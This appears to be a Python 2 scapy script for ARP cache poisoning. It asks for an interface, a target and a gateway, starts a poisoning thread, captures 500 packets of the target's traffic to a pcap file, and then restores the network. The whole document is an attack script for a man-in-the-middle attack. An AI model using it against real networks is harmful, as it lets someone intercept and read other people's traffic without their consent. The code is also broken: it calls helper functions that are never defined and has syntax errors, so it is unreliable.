from scapy.all import *
import os
import sys
import threading
import signal

interface = raw_input("Please specify interface: ")
target_ip = raw_input("Specify target ip: ")
gateway_ip = raw_input("Specify gateway ip: ")
packet_count = 500

conf.iface = interface

# silent mode
conf.verb = 0

print "Setting up %s " % interface

gateway_mac = get_mac(gateway_ip)

if gateway_mac == None:
    print "Failed to get gateway MAC. Exiting..."
    sys.exit(0)
else:
    print "Gateway found: %s is at %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)

if target_mac == None
    print "Failed to get target MAC. Exiting..."
    sys.exit(0)
else:
    print " Target %s is at %s" % target_ip, target_mac)

# start poisoning
poison_thread = threading.Thread(target = poison_target, args =
                (gateway_ip, gateway_mac, target_ip, target_mac))

poison_thread.start()

try:
    print "[*] Starting sniffer for %d packets" % packet_count

    bpf_filter = "ip host %s" % target_ip
    packets =sniff(count = packet_count, filter = bpf_filter, iface = interface)

    # print captured packets to pcap file
    wrpcap('arp.pcap', packets)

    # restore network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
